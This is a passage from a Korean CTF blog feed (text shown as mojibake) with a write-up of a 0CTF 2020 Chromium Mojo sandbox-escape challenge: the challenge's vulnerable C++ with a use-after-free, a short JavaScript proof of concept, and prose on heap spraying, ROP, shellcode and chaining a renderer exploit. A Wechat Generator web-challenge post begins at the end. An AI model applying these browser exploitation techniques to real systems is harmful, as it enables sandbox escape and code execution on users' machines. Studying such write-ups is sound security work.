&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@@ -0,0 +1,20 @@&lt;/span&gt;
&lt;span class=&quot;gi&quot;&gt;+module blink.mojom;
+
+interface TStorage {
+    Init() =&amp;gt; ();
+    CreateInstance() =&amp;gt; (pending_remote&amp;lt;blink.mojom.TInstance&amp;gt; instance);
+    GetLibcAddress() =&amp;gt; (uint64 addr);
+    GetTextAddress() =&amp;gt; (uint64 addr);
+};
+
+interface TInstance {
+    Push(uint64 value) =&amp;gt; ();
+    Pop() =&amp;gt; (uint64 value);
+    Set(uint64 index, uint64 value) =&amp;gt; ();
+    Get(uint64 index) =&amp;gt; (uint64 value);
+    SetInt(int64 value) =&amp;gt; ();
+    GetInt() =&amp;gt; (int64 value);
+    SetDouble(double value) =&amp;gt; ();
+    GetDouble() =&amp;gt; (double value);
+    GetTotalSize() =&amp;gt; (int64 size);
+};
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ì·¨ì•½ì ì€ ìƒˆë¡­ê²Œ ì¶”ê°€ëœ mojo ê¸°ëŠ¥ì—ì„œ ë°œìƒí•©ë‹ˆë‹¤. ì¶”ê°€ëœ ê¸°ëŠ¥ì€ TStorageë¡œ, Instanceë¥¼ ìƒì„±í•˜ì—¬ ì›í•˜ëŠ” ê°’ì„ ë„£ê±°ë‚˜ ê°€ì ¸ì˜¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ &lt;code class=&quot;highlighter-rouge&quot;&gt;GetLibcAddress()&lt;/code&gt; í•¨ìˆ˜ì™€ &lt;code class=&quot;highlighter-rouge&quot;&gt;GetTextAddress()&lt;/code&gt; í•¨ìˆ˜ë¥¼ í†µí•´ libc ì£¼ì†Œì™€ text base ì£¼ì†Œë¥¼ ê°€ì ¸ì˜¬ ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TStorageImpl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CreateInstance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CreateInstanceCallback&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;callback&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mojo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PendingRemote&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;blink&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mojom&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TInstance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;instance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mojo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MakeSelfOwnedReceiver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;make_unique&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TInstanceImpl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inner_db_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()),&lt;/span&gt;
                                &lt;span class=&quot;n&quot;&gt;instance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InitWithNewPipeAndPassReceiver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;move&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;callback&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;move&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;instance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ì·¨ì•½ì ì€ CreateInstance í•¨ìˆ˜ì—ì„œ ë°œìƒí•©ë‹ˆë‹¤. TInstanceë¥¼ ìƒì„±í•  ë•Œ ì¸ìë¡œ inner_db_ë¥¼ raw pointerë¡œ ì „ë‹¬í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &quot;content/browser/tstorage/inner_db_impl.h&quot;
&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;namespace&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;content&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;InnerDbImpl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InnerDbImpl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;InnerDbImpl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::~&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InnerDbImpl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InnerDbImpl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;queue_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;í•˜ì§€ë§Œ inner_db_ê°€ freeë  ë•Œ ë”°ë¡œ TInstanceì— ëŒ€í•œ ì²˜ë¦¬ê°€ ì—†ê¸° ë•Œë¬¸ì— TInstanceëŠ” ê·¸ëŒ€ë¡œ raw pointerë¥¼ ê°€ì§€ê³  ìˆê²Œ ë©ë‹ˆë‹¤. ë”°ë¼ì„œ UAF ì·¨ì•½ì ì´ ë°œìƒí•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;../mojo_bindings.js&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;../third_party/blink/public/mojom/tstorage/tstorage.mojom.js&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;blink&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mojom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;TStoragePtr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;Mojo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bindInterface&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;blink&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mojom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;TStorage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mojo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;makeRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;handle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;async&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;functioin&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
	&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ins1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createInstance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;instance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;reset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// heap spray&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;ins1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getTotalSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ìœ„ì™€ ê°™ì€ ì½”ë“œë¡œ pocë¥¼ ì‘ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. &lt;code class=&quot;highlighter-rouge&quot;&gt;ins1.getTotalSize();&lt;/code&gt;ì€ freeëœ inner_db_ë¥¼ ì‚¬ìš©í•˜ë¯€ë¡œ ë§Œì•½ &lt;code class=&quot;highlighter-rouge&quot;&gt;getTotalSize&lt;/code&gt; ë¥¼ í˜¸ì¶œí•˜ê¸° ì „ì— heap sprayë¥¼ í†µí•´ inner_db_ë¥¼ ë®ì–´ì“´ë‹¤ë©´ ì›í•˜ëŠ” ì£¼ì†Œë¡œ ripë¥¼ ë³€ê²½í•  ìˆ˜ ìˆê²Œ ë©ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;namespace&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;content&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;InnerDbImpl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InnerDb&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nl&quot;&gt;public:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;InnerDbImpl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InnerDbImpl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;override&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Pop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SetInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GetInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SetDouble&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;double&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;double&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GetDouble&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GetTotalSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;override&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;queue&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;queue_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;int64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;int_value_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;double&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;double_value_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;0.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ë˜í•œ InnerDbImpl classë¥¼ ë³´ë©´ queue_ê°€ ì¡´ì¬í•˜ê³  ê¸°ëŠ¥ì¤‘ì— ê·¸ queue_ì— ê°’ì„ push í•˜ê±°ë‚˜ popí•  ìˆ˜ ìˆëŠ” ê¸°ëŠ¥ì´ ì¡´ì¬í•©ë‹ˆë‹¤. ë”°ë¼ì„œ freeëœ InnerDbImplë¥¼ heap sprayë¥¼ í†µí•´ ë®ì–´ì“´ë‹¤ë©´ queue_ê°€ ë‚´ë¶€ì ìœ¼ë¡œ ê°€ë¥´í‚¤ê³  ìˆëŠ” ì£¼ì†Œë¥¼ ë³€ê²½í•˜ì—¬ arbitrary address read/writeê°€ ê°€ëŠ¥í•´ì§‘ë‹ˆë‹¤. ê·¸ë˜ì„œ ripë¥¼ ë³€ê²½í•  ìˆ˜ ìˆëŠ” ê¸°ëŠ¥ê³¼ ì›í•˜ëŠ” ë©”ëª¨ë¦¬ ì£¼ì†Œë¥¼ ì½ê³  ì“¸ ìˆ˜ ìˆëŠ” ê¸°ëŠ¥ì„ í†µí•´ sandboxë¥¼ escapeí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;h1 id=&quot;5-chromium-full-chain&quot;&gt;5. Chromium Full Chain&lt;/h1&gt;

&lt;p&gt;Chromium Full Chainì˜ ê²½ìš° ëŒ€íšŒë•Œ ì‹œê°„ì´ ë¶€ì¡±í•˜ì—¬ í•´ê²°í•˜ì§€ ëª»í•˜ê³  ëŒ€íšŒê°€ ëë‚œ ë’¤ì— í’€ ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤. ë¬¸ì œëŠ” ìœ„ ë‘ê°€ì§€ exploitì„ ì²´ì´ë‹í•˜ëŠ” ë¬¸ì œì˜€ëŠ”ë° ë°”ë€ì ì´ array bufferê°€ ptmallocì„ ì‚¬ìš©í•˜ì§€ ì•Šê²Œë˜ê³  ì›ë˜ chromeì—ì„œ array bufferì˜ backing storeë¥¼ í• ë‹¹í•  ë•Œ ì‚¬ìš©í•˜ëŠ” partition allocatorë¥¼ ì‚¬ìš©í•˜ê²Œ ëœ ì ì…ë‹ˆë‹¤. ê·¸ë˜ì„œ renderer exploitì„ ì²˜ìŒë¶€í„° ìƒˆë¡œ ì‘ì„±í•´ì•¼ í–ˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ë¨¼ì € ì·¨ì•½ì ì„ í†µí•´ freeëœ chunkì— next ptrì„ ë®ì–´ chunkë¥¼ ì›í•˜ëŠ”ê³³ì— í• ë‹¹í•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤. í•˜ì§€ë§Œ ì´ì „ê³¼ ê°™ì´ libc leakì´ ì¡´ì¬í•˜ì§€ ì•Šê¸° ë•Œë¬¸ì— ë°”ë¡œ ripë¥¼ ì»¨íŠ¸ë¡¤í•˜ëŠ”ê²Œ ë¶ˆê°€ëŠ¥í–ˆìŠµë‹ˆë‹¤. ê·¸ë˜ì„œ heap leakì„ ë¨¼ì € í•˜ê³  chunkê°€ í• ë‹¹ëœ page ìœ„ìª½ì— ì¡´ì¬í•˜ëŠ” slotì„ ì´ìš©í•´ text ì£¼ì†Œë¥¼ leak í–ˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ê·¸ë¦¬ê³  leakí•œ chrome binary ì£¼ì†Œì¤‘ rw ê¶Œí•œì´ ìˆëŠ” ì˜ì—­ì— ê°’ì„ ì­‰ ë®ì–´ë³´ë©´ì„œ ripê°€ ì»¨íŠ¸ë¡¤ ë˜ëŠ” ë¶€ë¶„ì„ ì°¾ì•˜ìŠµë‹ˆë‹¤. ì´í›„ ìŠ¤íƒ í”¼ë²—ì„ í†µí•´ ROPë¥¼ ì„±ê³µí•˜ì—¬ ì‰˜ì½”ë“œë¥¼ ì‹¤í–‰í•œ ë’¤ì—, RenderFrameImpl ê°ì²´ë¥¼ ì°¾ì•„ enabled_bindings_ì„ 2(BINDINGS_POLICY_MOJO_WEB_UI)ë¡œ ë³€ê²½í•˜ê³  ìƒˆë¡œê³ ì¹¨í•˜ë©´ Mojoë¥¼ í™œì„±í™”í•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤. mojoë¥¼ í™œì„±í™” í•œ ë‹¤ìŒì—”, ì´ë¯¸ ì‘ì„± í–ˆë˜ mojo exploit ì½”ë“œë¥¼ ê·¸ëŒ€ë¡œ ì‚¬ìš©í•˜ì—¬ sandbox escapeë¥¼ í•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ëŒ€íšŒ ì¤‘ì—ëŠ” rendererì—ì„œ ì‰˜ì½”ë“œë¥¼ ì‹¤í–‰ì‹œí‚¤ëŠ”ê²ƒê¹Œì§„ ì„±ê³µí–ˆì§€ë§Œ ì‰˜ì½”ë“œ ì‹¤í–‰ ì´í›„ ë‹¤ì‹œ ì •ìƒì ì¸ ì‹¤í–‰ íë¦„ì„ ë³µêµ¬í•˜ëŠ”ê²ƒì— ì‚½ì§ˆì„ ë„ˆë¬´ ë§ì´í•´ì„œ ëª»í’€ì—ˆìŠµë‹ˆë‹¤. ì‹œê°„ì´ ì¢€ ë” ìˆì—ˆë‹¤ë©´ í’€ ìˆ˜ ìˆì—ˆì„ ê²ƒ ê°™ìŠµë‹ˆë‹¤.&lt;/p&gt;
</description>
        <pubDate>Mon, 01 Jun 2020 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/2020-06-01/0ctf-Chromium-RCE-SBX-WriteUp</link>
        <guid isPermaLink="true">http://localhost:4000/2020-06-01/0ctf-Chromium-RCE-SBX-WriteUp</guid>
        
        <category>pwn</category>
        
        <category>ctf</category>
        
        <category>write-up</category>
        
        
      </item>
    
      <item>
        <title>0CTF/TCTF 2020 - Wechat Generator, Cloud Computing v2</title>
        <description>&lt;p&gt;ë¼ì˜¨í™”ì´íŠ¸í–‡ í•µì‹¬ì—°êµ¬íŒ€ ìµœì •ìˆ˜&lt;/p&gt;

&lt;h2 id=&quot;0ctftctf-2020-quals&quot;&gt;0CTF/TCTF 2020 Quals&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;2020.06.27 11:00 ~ 2020.06.29 11:00 KST (48 Hour)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;wechat-generator&quot;&gt;Wechat Generator&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;Web
261 Pts
32 solved&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Come and check my latest innovation! Itâ€™s normal to encounter some bugs and glitches since it is still in beta development.
&lt;a href=&quot;http://pwnable.org:5000/&quot;&gt;http://pwnable.org:5000/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/jeong61.png&quot; alt=&quot;/assets/jeong61.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Wechat Generator ë¬¸ì œì˜ ì»¨ì…‰ì€ ì…ë ¥í•œ ë‚´ìš©ì„ ë°”íƒ•ìœ¼ë¡œ Fake Wechat ì´ë¯¸ì§€ë¥¼ ìƒì„±í•´ì£¼ëŠ” ì„œë¹„ìŠ¤ì…ë‹ˆë‹¤.&lt;/p&gt;

